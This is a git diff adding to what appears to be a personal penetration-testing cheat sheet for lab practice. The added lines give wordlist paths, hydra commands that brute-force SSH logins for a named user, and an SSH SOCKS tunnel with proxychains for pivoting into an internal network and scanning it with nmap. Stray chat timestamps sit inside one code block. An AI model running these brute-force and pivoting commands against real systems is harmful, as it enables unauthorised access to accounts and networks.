@@ -561,6 +561,11 @@ nc -nlvp 443
 ````
 ````
 ### Hashing & Cracking
+#### Wordlists that worked
+````
+/usr/share/wordlists/rockyou.txt
+/usr/share/wfuzz/wordlist/others/common_pass.txt
+````
 #### Enumeration
 ````
 hashid <paste your hash here>
@@ -582,6 +587,12 @@ hashcat -m 0 -a 0 -o hashout eric.hash /home/jerm/rockyou.txt #if the original d
 ##### Cracking with Johntheripper
 ````
 john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+````
+##### Crakcing with hydra
+###### ssh
+````
+hydra -l megan -P /usr/share/wfuzz/wordlist/others/common_pass.txt $IP -t 4 ssh
+hydra -l megan -P /usr/share/wordlists/rockyou.txt $IP -t 4 ssh
 ````
 #### Cracking Zip files
 ````
@@ -835,6 +846,16 @@ https://www.ivoidwarranties.tech/posts/pentesting-tuts/pivoting/pivoting-basics/
 sshuttle -r sean@10.11.1.251 10.1.1.0/24 #run on your kali machine to proxy traffic into the IT Network
 #In this situation we have rooted a linux machine got user creds and can establish an sshuttle
 #You can visit the next network as normal and enumerate it as normal.
+#best used for everything else but nmap
+````
+#### ssh port foward
+##### Linux Enviorment
+````
+sudo echo "socks4 127.0.0.1 80" >> /etc/proxychains.conf 
+[7:06 PM]
+ssh -NfD 80 sean@10.11.1.251 10.1.1.0/24
+[7:07 PM]
+proxychains4 nmap -p- --min-rate=1000 10.1.1.27 -Pn #best used for nmap only
 ````
 #### Chisel
 ##### Chisel Windows
